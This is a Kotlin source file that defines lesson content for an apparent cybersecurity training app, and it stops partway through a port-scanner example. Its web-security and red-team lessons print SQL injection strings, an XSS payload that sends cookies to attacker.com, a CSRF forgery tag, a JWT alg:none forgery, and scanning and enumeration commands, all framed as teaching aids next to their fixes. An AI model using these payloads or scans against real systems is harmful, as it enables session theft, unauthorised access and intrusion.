package com.hackpath.app.data.repository

import com.hackpath.app.data.model.*
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class CourseContent @Inject constructor() {

    val allTracks: List<Track> = listOf(
        foundationsTrack(),
        networkingTrack(),
        webSecurityTrack(),
        redTeamTrack(),
        blueTeamTrack()
    )

    // ─────────────────────────────────────────────────────────────────────────
    // TRACK 1 – FOUNDATIONS
    // ─────────────────────────────────────────────────────────────────────────
    private fun foundationsTrack() = Track(
        id = "track_foundations",
        title = "Foundations",
        subtitle = "Python, data structures & algorithms from zero",
        icon = "🐍",
        category = TrackCategory.FOUNDATIONS,
        difficulty = Difficulty.BEGINNER,
        xpReward = 500,
        courses = listOf(
            Course(
                id = "course_python101",
                trackId = "track_foundations",
                title = "Python 101",
                description = "Learn Python from scratch. Variables, loops, functions and more.",
                difficulty = Difficulty.BEGINNER,
                xpReward = 150,
                lessons = listOf(
                    Lesson(
                        id = "py_vars",
                        courseId = "course_python101",
                        order = 1,
                        title = "Variables & Types",
                        content = """
**Variables** store data in memory. Python is dynamically typed — you don't declare the type.

```python
name = "Alice"   # str
age  = 25        # int
pi   = 3.14      # float
flag = True      # bool
```

**Type checking:**
```python
type(name)  # <class 'str'>
```

**String operations:**
```python
full = "Hello, " + name  # concatenation
upper = name.upper()     # "ALICE"
length = len(name)       # 5
```
Python variables are just **labels** pointing to objects in memory. Reassigning a variable moves the label — it doesn't change the original object.
                        """.trimIndent(),
                        codeExample = """
name = "Alice"
age  = 25

print(f"Name: {name}, Age: {age}")
print(f"Type of age: {type(age)}")
print(f"Name reversed: {name[::-1]}")
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "What does `type('hello')` return?",
                            options = listOf("<class 'string'>", "<class 'str'>", "string", "str"),
                            correctIndex = 1,
                            explanation = "Python's built-in string type is `str`, so `type('hello')` returns `<class 'str'>`."
                        )
                    ),
                    Lesson(
                        id = "py_loops",
                        courseId = "course_python101",
                        order = 2,
                        title = "Loops & Conditionals",
                        content = """
**if / elif / else:**
```python
score = 87
if score >= 90:
    grade = "A"
elif score >= 80:
    grade = "B"
else:
    grade = "C"
```

**for loop** iterates over any iterable:
```python
for i in range(5):
    print(i)   # 0 1 2 3 4

fruits = ["apple", "banana", "cherry"]
for fruit in fruits:
    print(fruit)
```

**while loop** runs until condition is False:
```python
count = 0
while count < 3:
    print(count)
    count += 1
```

**List comprehension** — compact loops that build lists:
```python
squares = [x**2 for x in range(10)]
evens   = [x for x in range(20) if x % 2 == 0]
```
                        """.trimIndent(),
                        codeExample = """
# FizzBuzz — a classic interview question
for n in range(1, 21):
    if n % 15 == 0:
        print("FizzBuzz")
    elif n % 3 == 0:
        print("Fizz")
    elif n % 5 == 0:
        print("Buzz")
    else:
        print(n)
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "What is the output of `[x*2 for x in range(3)]`?",
                            options = listOf("[0, 2, 4]", "[2, 4, 6]", "[1, 2, 3]", "[0, 1, 2]"),
                            correctIndex = 0,
                            explanation = "range(3) produces 0,1,2. Doubled: [0,2,4]."
                        )
                    ),
                    Lesson(
                        id = "py_functions",
                        courseId = "course_python101",
                        order = 3,
                        title = "Functions",
                        content = """
Functions are reusable blocks of code. Define once, call many times.

**Basic function:**
```python
def greet(name):
    return f"Hello, {name}!"

print(greet("Bob"))   # Hello, Bob!
```

**Default parameters:**
```python
def power(base, exponent=2):
    return base ** exponent

power(3)     # 9
power(2, 10) # 1024
```

***args and **kwargs:**
```python
def add(*numbers):
    return sum(numbers)

add(1, 2, 3, 4)   # 10

def show(**info):
    for k, v in info.items():
        print(f"{k}: {v}")

show(name="Alice", role="admin")
```

**Lambda functions** — anonymous one-liners:
```python
square = lambda x: x ** 2
nums = [3,1,4,1,5]
nums.sort(key=lambda x: -x)  # sort descending
```
                        """.trimIndent(),
                        codeExample = """
def caesar_cipher(text, shift):
    result = []
    for char in text:
        if char.isalpha():
            base = ord('A') if char.isupper() else ord('a')
            shifted = (ord(char) - base + shift) % 26 + base
            result.append(chr(shifted))
        else:
            result.append(char)
    return ''.join(result)

print(caesar_cipher("Hello, World!", 13))  # Uryyb, Jbeyq!
print(caesar_cipher("Uryyb, Jbeyq!", 13)) # Hello, World!
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "What does `lambda x: x % 2 == 0` do?",
                            options = listOf(
                                "Returns the remainder of x/2",
                                "Returns True if x is even",
                                "Doubles x",
                                "Returns True if x is odd"
                            ),
                            correctIndex = 1,
                            explanation = "x % 2 == 0 evaluates to True when x has no remainder divided by 2, i.e. when x is even."
                        )
                    ),
                    Lesson(
                        id = "py_oop",
                        courseId = "course_python101",
                        order = 4,
                        title = "Object-Oriented Programming",
                        content = """
OOP organises code around **objects** that bundle data and behaviour.

**Class definition:**
```python
class BankAccount:
    def __init__(self, owner, balance=0):
        self.owner   = owner
        self._balance = balance  # private by convention

    def deposit(self, amount):
        if amount > 0:
            self._balance += amount

    def withdraw(self, amount):
        if amount <= self._balance:
            self._balance -= amount
            return amount
        raise ValueError("Insufficient funds")

    @property
    def balance(self):
        return self._balance

    def __repr__(self):
        return f"BankAccount({self.owner!r}, {self._balance})"
```

**Inheritance:**
```python
class SavingsAccount(BankAccount):
    INTEREST_RATE = 0.05

    def apply_interest(self):
        self.deposit(self._balance * self.INTEREST_RATE)
```

**The four pillars of OOP:**
- **Encapsulation** — hide internal state, expose an API
- **Abstraction** — simplify complex internals
- **Inheritance** — share behaviour across classes
- **Polymorphism** — same interface, different behaviour
                        """.trimIndent(),
                        codeExample = """
class Packet:
    def __init__(self, src, dst, data):
        self.src  = src
        self.dst  = dst
        self.data = data

    def __repr__(self):
        return f"[{self.src} -> {self.dst}] {self.data!r}"

class EncryptedPacket(Packet):
    def __init__(self, src, dst, data, key):
        super().__init__(src, dst, self._xor(data, key))
        self._key = key

    @staticmethod
    def _xor(data, key):
        return bytes(b ^ key for b in data.encode()).hex()

p = EncryptedPacket("192.168.1.1", "10.0.0.1", "secret", 42)
print(p)
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "Which OOP principle does `self._balance` (single underscore) represent?",
                            options = listOf("Inheritance", "Polymorphism", "Encapsulation", "Abstraction"),
                            correctIndex = 2,
                            explanation = "The single underscore signals that `_balance` is internal — encapsulation hides state and exposes it only through methods."
                        )
                    )
                )
            ),
            Course(
                id = "course_dsa",
                trackId = "track_foundations",
                title = "Data Structures & Algorithms",
                description = "Arrays, linked lists, trees, sorting and searching.",
                difficulty = Difficulty.BEGINNER,
                xpReward = 200,
                lessons = listOf(
                    Lesson(
                        id = "dsa_arrays",
                        courseId = "course_dsa",
                        order = 1,
                        title = "Arrays & Hash Maps",
                        content = """
**Arrays** (Python lists) give O(1) random access and O(n) search.

**Hash Maps** (Python dicts) give O(1) average for insert/delete/lookup.

```python
# Array operations
arr = [3, 1, 4, 1, 5, 9]
arr.append(2)        # O(1)  – amortised
arr.pop()            # O(1)  – from end
arr.insert(0, 99)    # O(n)  – shifts elements
arr.remove(1)        # O(n)  – finds & removes first match

# Hash map operations
freq = {}
for char in "hello world":
    freq[char] = freq.get(char, 0) + 1
# {'h':1, 'e':1, 'l':3, 'o':2, ' ':1, 'w':1, 'r':1, 'd':1}
```

**Two-pointer technique** — solves many array problems in O(n):
```python
def two_sum(nums, target):
    seen = {}
    for i, n in enumerate(nums):
        complement = target - n
        if complement in seen:
            return [seen[complement], i]
        seen[n] = i
```
                        """.trimIndent(),
                        codeExample = """
# Count character frequency — basis for frequency analysis attacks
def char_frequency(text):
    freq = {}
    total = len([c for c in text if c.isalpha()])
    for c in text.lower():
        if c.isalpha():
            freq[c] = freq.get(c, 0) + 1
    return {k: round(v/total*100, 1) for k, v in sorted(freq.items(), key=lambda x: -x[1])}

ciphertext = "gur dhvpx oebja sbk whzcf bire gur ynml qbt"
print(char_frequency(ciphertext))
# In English, 'e' is ~12.7% — the most frequent letter
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "What is the average time complexity of a hash map lookup?",
                            options = listOf("O(n)", "O(log n)", "O(1)", "O(n²)"),
                            correctIndex = 2,
                            explanation = "Hash maps compute an index from the key via a hash function, giving O(1) average lookup — that's why they're ubiquitous."
                        )
                    ),
                    Lesson(
                        id = "dsa_trees",
                        courseId = "course_dsa",
                        order = 2,
                        title = "Trees & Graphs",
                        content = """
**Binary Search Tree** — each node's left children are smaller, right children are larger.

```python
class Node:
    def __init__(self, val):
        self.val   = val
        self.left  = None
        self.right = None

class BST:
    def insert(self, root, val):
        if not root:
            return Node(val)
        if val < root.val:
            root.left  = self.insert(root.left,  val)
        else:
            root.right = self.insert(root.right, val)
        return root

    def search(self, root, val):
        if not root or root.val == val:
            return root
        if val < root.val:
            return self.search(root.left,  val)
        return self.search(root.right, val)
```

**Graph BFS** — used heavily in network scanning:
```python
from collections import deque

def bfs(graph, start):
    visited = set()
    queue   = deque([start])
    order   = []
    while queue:
        node = queue.popleft()
        if node not in visited:
            visited.add(node)
            order.append(node)
            queue.extend(graph.get(node, []))
    return order
```
                        """.trimIndent(),
                        codeExample = """
# Network topology as a graph — simulate host discovery
network = {
    "192.168.1.1": ["192.168.1.10", "192.168.1.20"],
    "192.168.1.10": ["192.168.1.11", "192.168.1.12"],
    "192.168.1.20": ["192.168.1.21"],
    "192.168.1.11": [],
    "192.168.1.12": [],
    "192.168.1.21": []
}

from collections import deque

def discover_hosts(network, gateway):
    visited = set()
    queue   = deque([gateway])
    while queue:
        host = queue.popleft()
        if host not in visited:
            visited.add(host)
            print(f"Discovered: {host}")
            queue.extend(network.get(host, []))

discover_hosts(network, "192.168.1.1")
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "Which algorithm is used to find the shortest path in an unweighted graph?",
                            options = listOf("DFS", "BFS", "Binary search", "Quicksort"),
                            correctIndex = 1,
                            explanation = "BFS explores nodes level by level, so it naturally finds the shortest path (fewest hops) in unweighted graphs."
                        )
                    )
                )
            )
        )
    )

    // ─────────────────────────────────────────────────────────────────────────
    // TRACK 2 – NETWORKING
    // ─────────────────────────────────────────────────────────────────────────
    private fun networkingTrack() = Track(
        id = "track_networking",
        title = "Networking",
        subtitle = "TCP/IP, protocols, and packet analysis",
        icon = "🌐",
        category = TrackCategory.NETWORKING,
        difficulty = Difficulty.INTERMEDIATE,
        xpReward = 700,
        courses = listOf(
            Course(
                id = "course_tcpip",
                trackId = "track_networking",
                title = "TCP/IP & The OSI Model",
                description = "How data moves across the internet.",
                difficulty = Difficulty.INTERMEDIATE,
                xpReward = 200,
                lessons = listOf(
                    Lesson(
                        id = "net_osi",
                        courseId = "course_tcpip",
                        order = 1,
                        title = "OSI Model",
                        content = """
The **OSI model** has 7 layers. Each layer has a job and talks only to the layers directly above/below it.

| Layer | Name         | Protocol examples       | Unit    |
|-------|--------------|-------------------------|---------|
| 7     | Application  | HTTP, DNS, FTP, SMTP    | Data    |
| 6     | Presentation | TLS/SSL, MIME           | Data    |
| 5     | Session      | NetBIOS, RPC            | Data    |
| 4     | Transport    | TCP, UDP                | Segment |
| 3     | Network      | IP, ICMP, OSPF          | Packet  |
| 2     | Data Link    | Ethernet, ARP, Wi-Fi    | Frame   |
| 1     | Physical     | Cables, RF, fibre       | Bit     |

**Why it matters for security:**
- Attacks target specific layers. SQL injection → Layer 7. ARP spoofing → Layer 2. IP spoofing → Layer 3.
- Defences must match the layer: firewalls (Layer 3-4), WAFs (Layer 7), 802.1X (Layer 2).

**Mnemonic:** _Please Do Not Throw Sausage Pizza Away_ (Physical → Application)
                        """.trimIndent(),
                        codeExample = """
# Python socket — raw Layer 4 (Transport) programming
import socket

def tcp_connect(host, port, timeout=2):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        result = s.connect_ex((host, port))
        s.close()
        return result == 0   # 0 = success
    except socket.error:
        return False

# Scan first 1024 well-known ports (educational — scan only systems you own)
host = "127.0.0.1"
open_ports = [p for p in range(1, 1025) if tcp_connect(host, p)]
print(f"Open ports on {host}: {open_ports}")
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "ARP spoofing attacks which OSI layer?",
                            options = listOf("Layer 3 – Network", "Layer 2 – Data Link", "Layer 4 – Transport", "Layer 7 – Application"),
                            correctIndex = 1,
                            explanation = "ARP (Address Resolution Protocol) maps IP addresses to MAC addresses — that's Layer 2, the Data Link layer."
                        )
                    ),
                    Lesson(
                        id = "net_tcp",
                        courseId = "course_tcpip",
                        order = 2,
                        title = "TCP Handshake & Flags",
                        content = """
TCP is **connection-oriented** and **reliable** (acknowledgements + retransmission).

**Three-Way Handshake:**
```
Client          Server
  ──── SYN ────►
  ◄─ SYN-ACK ──
  ──── ACK ────►
  [Connected]
```

**TCP Flags:**
| Flag | Meaning               | Attack context                    |
|------|-----------------------|-----------------------------------|
| SYN  | Synchronise (open)    | SYN flood DoS, stealth scan       |
| ACK  | Acknowledge           | ACK scan bypasses stateless FW    |
| FIN  | Finish (close)        | FIN scan for firewall evasion     |
| RST  | Reset (abort)         | RST injection to kill sessions    |
| PSH  | Push data immediately |                                   |
| URG  | Urgent data           |                                   |

**SYN scan (half-open):**
The scanner sends SYN but never completes the handshake. A SYN-ACK response means the port is **open**; RST means **closed**. This leaves no log entry on many older systems — but modern IDS/IPS detects it.

**Sequence number prediction** was a major vulnerability: predict the server's next sequence number and inject packets. Fixed with randomised ISN (Initial Sequence Numbers).
                        """.trimIndent(),
                        codeExample = """
# Demonstrate TCP state machine concepts
# (Educational — illustrates what nmap does internally)
import socket, struct

def decode_tcp_flags(flags_byte):
    names = ['FIN','SYN','RST','PSH','ACK','URG','ECE','CWR']
    return [names[i] for i in range(8) if flags_byte & (1 << i)]

# Simulated captured flag byte (SYN+ACK = 0x12 = 18)
raw_flags = 0x12
print("Flags set:", decode_tcp_flags(raw_flags))  # ['SYN', 'ACK']

# RST+ACK = 0x14 = 20
print("Flags set:", decode_tcp_flags(0x14))        # ['RST', 'ACK']
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "What does a SYN-ACK response during a port scan mean?",
                            options = listOf(
                                "Port is closed",
                                "Port is filtered by a firewall",
                                "Port is open and listening",
                                "Host is offline"
                            ),
                            correctIndex = 2,
                            explanation = "SYN-ACK is the server's positive reply to a SYN. It means the port is open and the server is ready to accept the connection."
                        )
                    )
                )
            ),
            Course(
                id = "course_linux",
                trackId = "track_networking",
                title = "Linux Command Line",
                description = "Master the terminal — the hacker's native environment.",
                difficulty = Difficulty.INTERMEDIATE,
                xpReward = 180,
                lessons = listOf(
                    Lesson(
                        id = "linux_basics",
                        courseId = "course_linux",
                        order = 1,
                        title = "Essential Commands",
                        content = """
Linux is the dominant OS in servers, cloud, and security tools. Every security professional must be fluent in the terminal.

**File system navigation:**
```bash
pwd             # print working directory
ls -la          # list all files with permissions
cd /etc         # change directory
cd ~            # go home
cd -            # go back

# Permissions: rwxr-xr-x = owner:read/write/execute, group:read/execute, others:read/execute
chmod 755 script.sh    # rwxr-xr-x
chmod +x  script.sh    # add execute bit
chown user:group file  # change owner
```

**File operations:**
```bash
cat /etc/passwd          # show file contents
less /var/log/syslog     # scroll through large files
grep "error" syslog      # search file contents
grep -rn "password" /etc # recursive search
find / -name "*.conf" 2>/dev/null  # find config files
```

**Process & network:**
```bash
ps aux               # all running processes
top / htop           # live process monitor
netstat -tulpn       # open ports + PIDs
ss -tulpn            # modern replacement
lsof -i :80          # which process owns port 80
kill -9 <PID>        # force kill process
```
                        """.trimIndent(),
                        codeExample = """
#!/bin/bash
# Simple network recon script (run on systems you own or have permission)

TARGET="192.168.1.0/24"
echo "[*] Scanning ${'$'}TARGET"

# Ping sweep
for i in {1..254}; do
    ip="192.168.1.${'$'}i"
    ping -c1 -W1 "${'$'}ip" > /dev/null 2>&1 && echo "[+] Host up: ${'$'}ip" &
done
wait

# Port check on a single host
check_port() {
    (echo > /dev/tcp/$1/$2) 2>/dev/null && echo "  Port $2: OPEN"
}
echo "[*] Checking common ports on 192.168.1.1"
for port in 22 80 443 3306 8080; do
    check_port 192.168.1.1 ${'$'}port
done
                        """.trimIndent(),
                        codeLanguage = "bash",
                        quiz = Quiz(
                            question = "What does `grep -rn 'password' /etc` do?",
                            options = listOf(
                                "Changes passwords recursively",
                                "Recursively searches all files under /etc for the string 'password', showing line numbers",
                                "Deletes files containing 'password'",
                                "Encrypts passwords in /etc"
                            ),
                            correctIndex = 1,
                            explanation = "-r means recursive (search subdirectories), -n shows line numbers. This is how defenders check for hard-coded credentials in config files."
                        )
                    )
                )
            )
        )
    )

    // ─────────────────────────────────────────────────────────────────────────
    // TRACK 3 – WEB SECURITY (Attack patterns for defence)
    // ─────────────────────────────────────────────────────────────────────────
    private fun webSecurityTrack() = Track(
        id = "track_web_security",
        title = "Web Security",
        subtitle = "OWASP Top 10 — understand attacks to prevent them",
        icon = "🕸️",
        category = TrackCategory.WEB_DEV,
        difficulty = Difficulty.INTERMEDIATE,
        xpReward = 900,
        courses = listOf(
            Course(
                id = "course_owasp",
                trackId = "track_web_security",
                title = "OWASP Top 10",
                description = "The ten most critical web vulnerabilities, how they work, and how to fix them.",
                difficulty = Difficulty.INTERMEDIATE,
                xpReward = 300,
                lessons = listOf(
                    Lesson(
                        id = "owasp_sqli",
                        courseId = "course_owasp",
                        order = 1,
                        title = "SQL Injection",
                        content = """
**SQL Injection** is the #1 most damaging web vulnerability. An attacker inserts SQL code into user input that gets executed by the database.

**How it works — vulnerable code:**
```python
# ❌ NEVER do this
username = request.args['user']
query = f"SELECT * FROM users WHERE username='{username}'"
db.execute(query)
```

**Attack input:**
```
username = ' OR '1'='1
```
Resulting query:
```sql
SELECT * FROM users WHERE username='' OR '1'='1'
-- '1'='1' is always true → returns ALL users
```

**Dump the database:**
```
' UNION SELECT table_name,null FROM information_schema.tables--
```

**Authentication bypass:**
```
admin'--
-- The -- comments out the password check
```

**The fix — parameterised queries (prepared statements):**
```python
# ✅ ALWAYS use this
username = request.args['user']
query = "SELECT * FROM users WHERE username = ?"
db.execute(query, (username,))
# The driver escapes the value — it can NEVER be interpreted as SQL
```

**Defence checklist:**
1. Always use parameterised queries or ORMs
2. Apply least-privilege DB accounts (no `DROP TABLE` rights for the app)
3. Input validation — whitelist expected characters
4. WAF rules for SQLi patterns
5. Error messages must not leak SQL details
                        """.trimIndent(),
                        codeExample = """
# Demonstration of vulnerable vs safe code
# Run this with an in-memory SQLite database

import sqlite3

conn = sqlite3.connect(":memory:")
conn.execute("CREATE TABLE users (id INT, username TEXT, password TEXT)")
conn.execute("INSERT INTO users VALUES (1,'admin','s3cr3t')")
conn.execute("INSERT INTO users VALUES (2,'alice','pass123')")
conn.commit()

# ❌ Vulnerable
def login_unsafe(username, password):
    q = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f"  Query: {q}")
    return conn.execute(q).fetchall()

# ✅ Safe
def login_safe(username, password):
    q = "SELECT * FROM users WHERE username=? AND password=?"
    return conn.execute(q, (username, password)).fetchall()

attack = "' OR '1'='1"
print("=== VULNERABLE ===")
print("Normal login:", login_unsafe("admin", "s3cr3t"))
print("Injection:   ", login_unsafe(attack, attack))

print("\n=== SAFE ===")
print("Normal login:", login_safe("admin", "s3cr3t"))
print("Injection:   ", login_safe(attack, attack))  # returns []
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "Why do parameterised queries prevent SQL injection?",
                            options = listOf(
                                "They encrypt the query",
                                "They limit the length of user input",
                                "The database driver sends data and SQL separately — the data is never interpreted as code",
                                "They hash the user input"
                            ),
                            correctIndex = 2,
                            explanation = "Parameterised queries send the SQL structure and the data as separate components. The DB engine treats the parameter strictly as a value, not as executable SQL code."
                        )
                    ),
                    Lesson(
                        id = "owasp_xss",
                        courseId = "course_owasp",
                        order = 2,
                        title = "Cross-Site Scripting (XSS)",
                        content = """
**XSS** lets attackers inject JavaScript into pages viewed by other users. The browser trusts content from your site — so injected scripts run in the victim's session.

**Three types:**
1. **Stored XSS** — malicious script saved to DB, served to all visitors
2. **Reflected XSS** — script in URL, reflected in response
3. **DOM XSS** — client-side JS writes attacker-controlled data to the DOM

**Stored XSS attack payload:**
```html
<!-- Posted as a comment -->
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie)
</script>
```
Every visitor who loads the page sends their session cookie to the attacker.

**Reflected XSS:**
```
https://site.com/search?q=<script>alert(document.cookie)</script>
```

**Prevention:**
```python
# ❌ Vulnerable — raw HTML
return f"<h1>Hello, {username}</h1>"

# ✅ Safe — HTML-encode all output
from html import escape
return f"<h1>Hello, {escape(username)}</h1>"
```

**Content Security Policy (CSP) header:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```
This tells browsers to only run scripts from your own domain — a critical second layer of defence.

**Checklist:**
1. HTML-encode all user-controlled output
2. Use modern frameworks (React, Vue) that auto-escape by default
3. Set CSP headers
4. Set `HttpOnly` flag on session cookies so JS can't read them
5. Input validation/sanitisation
                        """.trimIndent(),
                        codeExample = """
from html import escape

def render_comment_safe(user_input: str) -> str:
    return f'<p class="comment">{escape(user_input)}</p>'

def render_comment_unsafe(user_input: str) -> str:
    return f'<p class="comment">{user_input}</p>'

payload = '<img src=x onerror="alert(\'XSS\')">'

print("UNSAFE:", render_comment_unsafe(payload))
# <p class="comment"><img src=x onerror="alert('XSS')"></p>  ← EXECUTES

print("SAFE:  ", render_comment_safe(payload))
# <p class="comment">&lt;img src=x onerror=&quot;alert(&#x27;XSS&#x27;)&quot;&gt;</p>
# ↑ The < > " ' are escaped — browser renders text, not HTML
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "Which cookie attribute prevents JavaScript from reading a session cookie?",
                            options = listOf("Secure", "SameSite=Strict", "HttpOnly", "Path=/"),
                            correctIndex = 2,
                            explanation = "HttpOnly instructs the browser to block JavaScript access to the cookie — even if XSS runs, it can't steal the session token."
                        )
                    ),
                    Lesson(
                        id = "owasp_csrf",
                        courseId = "course_owasp",
                        order = 3,
                        title = "CSRF & Broken Auth",
                        content = """
**CSRF (Cross-Site Request Forgery)** tricks an authenticated user's browser into making unintended requests.

**Scenario:**
1. Victim is logged into their bank at bank.com
2. Victim visits attacker.com which contains:
```html
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```
3. The browser automatically sends the victim's bank cookies with the request
4. Bank executes the transfer

**CSRF Token Defence:**
Every state-changing form includes a secret random token:
```html
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="a8f3...9b2c">
  ...
</form>
```
The server validates the token on every POST. An attacker can't include the correct token because they can't read the victim's page (Same Origin Policy).

**Other protections:**
- `SameSite=Strict` cookie attribute — browser won't send cookies in cross-site requests
- Check `Origin` / `Referer` header
- Require re-authentication for sensitive actions

**Broken Authentication issues:**
- Weak passwords allowed
- No rate limiting on login → brute force
- Session tokens not invalidated on logout
- Predictable session IDs
- JWT with `alg:none` vulnerability

**JWT `alg:none` attack:**
```python
# Attacker changes header to {"alg":"none"} and removes signature
# Many early JWT libraries accepted this!
header = base64url({"alg":"none","typ":"JWT"})
payload = base64url({"user":"admin","role":"superadmin"})
token = header + "." + payload + "."  # no signature
```
                        """.trimIndent(),
                        codeExample = """
import secrets, hashlib, hmac

# CSRF token generation and validation
class CSRFProtection:
    def __init__(self):
        self._tokens = {}

    def generate_token(self, session_id: str) -> str:
        token = secrets.token_hex(32)
        self._tokens[session_id] = token
        return token

    def validate_token(self, session_id: str, token: str) -> bool:
        expected = self._tokens.get(session_id)
        if not expected:
            return False
        # constant-time comparison prevents timing attacks
        return hmac.compare_digest(expected, token)

csrf = CSRFProtection()
sid  = "user_session_abc123"

token = csrf.generate_token(sid)
print("Generated token:", token[:16] + "...")
print("Valid token:    ", csrf.validate_token(sid, token))          # True
print("Forged token:   ", csrf.validate_token(sid, "forged_value")) # False
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "Why does a CSRF token prevent the attack?",
                            options = listOf(
                                "It encrypts the request",
                                "The attacker's site can't read the token from the victim's page due to Same Origin Policy",
                                "It blocks cross-origin requests entirely",
                                "It validates the user's IP address"
                            ),
                            correctIndex = 1,
                            explanation = "The Same Origin Policy prevents attacker.com from reading bank.com's page, so the attacker can't extract the CSRF token to include in the forged request."
                        )
                    )
                )
            )
        )
    )

    // ─────────────────────────────────────────────────────────────────────────
    // TRACK 4 – RED TEAM (Offensive — understand to defend)
    // ─────────────────────────────────────────────────────────────────────────
    private fun redTeamTrack() = Track(
        id = "track_red_team",
        title = "Red Team",
        subtitle = "Think like an attacker — ethical offensive skills for defence",
        icon = "🔴",
        category = TrackCategory.RED_TEAM,
        difficulty = Difficulty.ADVANCED,
        xpReward = 1200,
        courses = listOf(
            Course(
                id = "course_recon",
                trackId = "track_red_team",
                title = "Reconnaissance",
                description = "Passive and active information gathering before an engagement.",
                difficulty = Difficulty.ADVANCED,
                xpReward = 250,
                lessons = listOf(
                    Lesson(
                        id = "recon_osint",
                        courseId = "course_recon",
                        order = 1,
                        title = "OSINT — Open Source Intelligence",
                        content = """
**OSINT** uses publicly available data to map a target before touching their systems. It's fully legal and creates zero network noise.

**People / company:**
- **LinkedIn** — employee names, tech stack, job postings reveal internal tools
- **Shodan** — search engine for internet-connected devices (`org:TargetCorp`)
- **Censys** — certificate transparency, open services
- **BuiltWith / Wappalyzer** — web tech fingerprinting

**DNS enumeration:**
```bash
# Find subdomains passively
amass enum -passive -d example.com
subfinder -d example.com

# Certificate transparency logs (no traffic to target)
curl "https://crt.sh/?q=%.example.com&output=json" | jq '.[].name_value'

# Active DNS brute-force (requires permission)
dnsrecon -d example.com -D /usr/share/wordlists/subdomains.txt
```

**Google Dorks** — advanced search operators:
```
site:example.com filetype:pdf        # find PDFs
site:example.com inurl:admin         # admin panels
"example.com" filetype:sql           # exposed DB dumps
intext:"password" site:pastebin.com  # leaked credentials
```

**Email harvesting:**
```bash
theHarvester -d example.com -b google,bing,linkedin
```

**What defenders do with this knowledge:**
- Monitor certificate transparency logs for unauthorised subdomains
- Google Dork your own organisation regularly
- Remove sensitive info from job postings
- Set up Google Alerts for company name + "password" / "breach"
                        """.trimIndent(),
                        codeExample = """
import urllib.request, json, ssl

# Query crt.sh for certificate transparency data (legal — public data)
def find_subdomains_via_certs(domain: str) -> set[str]:
    url = f"https://crt.sh/?q=%.{domain}&output=json"
    ctx = ssl.create_default_context()
    try:
        with urllib.request.urlopen(url, context=ctx, timeout=10) as resp:
            data = json.loads(resp.read())
        subs = set()
        for entry in data:
            for name in entry.get("name_value", "").split("\n"):
                name = name.strip().lower().lstrip("*.")
                if name.endswith(domain):
                    subs.add(name)
        return subs
    except Exception as e:
        return {f"Error: {e}"}

# Example — replace with a domain you own or have permission to test
results = find_subdomains_via_certs("example.com")
for sub in sorted(results)[:10]:
    print(sub)
                        """.trimIndent(),
                        codeLanguage = "python",
                        quiz = Quiz(
                            question = "Why is OSINT considered 'passive' recon?",
                            options = listOf(
                                "It only works on internal networks",
                                "You gather information from public sources without sending packets to the target",
                                "It requires special hardware",
                                "It only works with government databases"
                            ),
                            correctIndex = 1,
                            explanation = "Passive recon collects publicly available information (search engines, DNS, certificates) without the target ever seeing a connection from you. Active recon sends probes directly to their systems."
                        )
                    ),
                    Lesson(
                        id = "recon_scanning",
                        courseId = "course_recon",
                        order = 2,
                        title = "Network Scanning & Enumeration",
                        content = """
**Active recon** sends packets to the target. Always get written permission first.

**nmap — the scanner:**
```bash
# Ping sweep (host discovery)
nmap -sn 192.168.1.0/24

# SYN scan (requires root) — fast, stealthy
nmap -sS -p- 192.168.1.10

# Service & version detection
nmap -sV -sC 192.168.1.10

# OS fingerprinting
nmap -O 192.168.1.10

# Aggressive all-in-one (noisy!)
nmap -A 192.168.1.10

# Output to file for later analysis
nmap -oN scan.txt 192.168.1.10
```

**Service-specific enumeration:**
```bash
# SMB (Windows file sharing) — goldmine of info
enum4linux -a 192.168.1.10
smbclient -L //192.168.1.10 -N

# Web directories
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
ffuf -u http://target.com/FUZZ -w wordlist.txt

# SNMP — often left with default community strings
snmpwalk -c public -v1 192.168.1.10
```

**Banner grabbing:**
```bash
nc -v 192.168.1.10 22      # SSH version
nc -v 192.168.1.10 80      # HTTP server
telnet 192.168.1.10 25     # SMTP server
```

**What the scan reveals:**
- Open ports → attack surface
- Service versions → known CVEs
- Operating system → exploit compatibility
- Config files exposed → credentials

**Blue team defence:**
- IDS/IPS to detect and block scan patterns (nmap -sS generates half-open connections)
- Disable unused ports/services
- Never expose management interfaces (SSH, RDP) directly to internet
- Implement deception (honeypots on non-standard ports)
                        """.trimIndent(),
                        codeExample = """
import socket, concurrent.futures

# Educational port scanner — scan only your own systems
def scan_port(host: str, port: int, timeout: float = 0.5) -> tuple[int, bool, str]:
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((host, port))
        banner = ""
        if result == 0:
            try:
                sock.send(b"HEAD / HTTP/1.0\r\n\r\n")
                banner = sock.recv(256).decode(errors="replace").split("\n")[0].strip()
            except:
                pass
        sock.close()
        return port, result == 0, banner
    except:
        return port, False, ""

COMMON_PORTS = {
    21:"FTP", 22:"SSH", 23:"Telnet", 25:"SMTP", 53:"DNS",
    80:"HTTP", 110:"POP3", 143:"IMAP", 443:"HTTPS",
    445:"SMB", 3306:"MySQL", 3389:"RDP", 8080:"HTTP-Alt"
}

def fast_scan(host: str) -> None:
    print(f"\n[*] Scanning {host}")
